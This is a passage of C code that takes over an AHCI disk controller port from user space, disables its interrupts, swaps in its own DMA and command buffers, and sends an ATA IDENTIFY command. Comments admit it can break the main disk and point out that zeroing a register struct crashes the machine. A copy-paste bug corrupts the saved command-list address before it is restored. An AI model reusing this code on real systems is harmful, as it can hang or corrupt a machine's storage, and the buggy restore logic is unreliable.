 exit(1);
 }
 print_ahci_info((ahci_host_t *) ptr);
 p = (ahci_host_t *)ptr;
 // Disable interrupts for this device so the kernel doesn't get involved.
 // This obviously breaks if it's the main disk, since it will stop
 // working...
 disable_interrupts(p);
 if (p->cap & HOST_CAP_64) {
 printf("Supports 64-bit addresses\n");
 }
 /* This means the FIS DMA setup functionality is hidden by the AHCI
 * controller itself, and it will copy to our buffers, specified via SG in
 * other FIS directly */
 if (p->cap & HOST_CAP_NCQ) {
 printf("Supports native command queuing\n");
 }
 // This would influence our CFIS construction later
 if (p->cap & HOST_CAP_PMP) {
 printf("Supports port multiplier\n");
 }
 // should stay below 1 page to ensure memory contiguity
 dma = alloc_phy(PAGE_SIZE, &dma_phy);
 cmd_list = alloc_phy(PAGE_SIZE, &cmd_list_phy);
 fis_buf = alloc_phy(PAGE_SIZE, &fis_buf_phy);
 cmd = alloc_phy(PAGE_SIZE, &cmd_phy);
 printf("DMA buffer @ 0x%lx\n", (uint64_t)dma_phy);
 printf("cmd list buffer @ 0x%lx\n", (uint64_t)cmd_list_phy);
 printf("FIS buffer @ 0x%lx\n", (uint64_t)fis_buf_phy);
 printf("cmd buffer @ 0x%lx\n", (uint64_t)cmd_phy);
 memcpy(last_fis_page, fis_buf, PAGE_SIZE);
 
 int32_t tport = find_inuse_port(p);
 hba_port_t * hbap;
 hbap = ahci_port_entry((char *)p, tport);
 // if you want to just crash a machine you can zero out everything
 //memset(hbap, 0, sizeof(hba_port_t));
 orig_fis = hbap->fb;
 orig_fisu = hbap->fbu;
 orig_cmd_list = hbap->clb;
 orig_cmd_list = hbap->clbu;
 // XXX - stopping like this doesn't seem to actually work
 //stop_cmd(hbap);
 hbap->fb = (uint64_t)fis_buf_phy & 0xfffffffff;
 hbap->fbu = 0;
 hbap->clb = (uint64_t)cmd_list_phy & 0xfffffffff;
 hbap->clbu = 0;
 //start_cmd(hbap);
 memset(&fis, 0, sizeof(fis));
 memset(&setup_fis, 0, sizeof(setup_fis));
 // build H2D fis
 fis.type = FIS_TYPE_REG_H2D;
 fis.opts = 1 << 7; // Set the Command bit
 fis.command = ATA_CMD_ID_ATA;
 // If NCQ is used, these addrs shoudln't be needed, as the SG will be used
 // instead? Set them anyway just in case
 fis.lba_low = (dma_phy >> 8 ) & 0xff;
 fis.lba_mid = (dma_phy >> 16) & 0xff;
 fis.lba_hi = (dma_phy >> 24) & 0xff;
 fis.sect_count = 1;
 fis_len = 5;
 buf_len = sizeof(uint16_t) * ATA_ID_WORDS;
 memcpy(cmd, &fis, fis_len*4);
 cmd_hdr = (struct cmd_hdr *)cmd_list;
 cmd_hdr->ctba = (cmd_phy & 0xffffffff);
 cmd_hdr->ctbau = ((cmd_phy >> 16) >> 16);
 // These assume we are using the first slot
 cmd_sg = (struct cmd_sg *)(cmd + AHCI_CMD_TBL_HDR_SZ);
 cmd_sg->info = (buf_len-1) & 0x3fffff;
 cmd_sg->dba = dma_phy & 0xFFFFFFFF;
 cmd_sg->dba_upper = ((dma_phy >> 16) >> 16);
 
 // 1 << 16 represent a single SG count in PRDTL
 cmd_hdr->opts |= fis_len | (1 << 16);
 printf("interrupt status before: 0x%x\n", hbap->is);
 printf("start bit before: %d\n", hbap->cmd & 1);
 tmp = hbap->cmd;
 hbap->cmd |= tmp | 1;
 //hbap->sact = 1; // required when issuing NCQ command
 hbap->ci = 1; // slot 0 XXX - needs to be dynamic if different slot
 // in use
 memcpy(last_cmd_page, cmd_list, PAGE_SIZE);
 sleep(1);
 complete = 0;
 printf("interrupt status after: 0x%x\n", hbap->is);
 print_interrupt_bits(hbap->is);
 // Wait for something to use our physical address
 printf("Waiting for command completion\n");
 done = 0;
 while(!done) {
 if ((hbap->ci & 1) == 0 && !complete) {
 printf("Seems to have completed...\n");
 complete = 1;
 }
 else if (!complete) {
 printf("wasn't complete\n");
 }
 if ((hbap->is & PORT_IRQ_TF_ERR)) {
 print_interrupt_bits(hbap->is);
 print_ahci_port(hbap);
 printf("Taskfile error\n");
 printf("tfd : 0x%x\n", hbap->tfd);
 printf("DIAG error\n");
 printf("diag : 0x%x\n", hbap->serr);
 hexdump(dma, 256);
 break;
 }
 sleep(1);
 for (i = 0; i < PAGE_SIZE; i++) {
 // Anything non-zero is interesting
 if (dma[i]) {
 printf("Got response data in DMA buffer:\n");
 hexdump(dma, PAGE_SIZE);
 done = 1;
 break;
 
  }
 }
 }
 hbap->fb = orig_fis;
 hbap->fbu = orig_fisu;
 hbap->clb = orig_cmd_list;
 hbap->clbu = orig_cmd_listu;
 enable_interrupts(p);
 munmap(dma, PAGE_SIZE);
 munmap(cmd_list, PAGE_SIZE);
 munmap(cmd, PAGE_SIZE);
 munmap(fis_buf, PAGE_SIZE);
 munmap(ptr, total_read_size);
 close(fd);
 return 0;
}
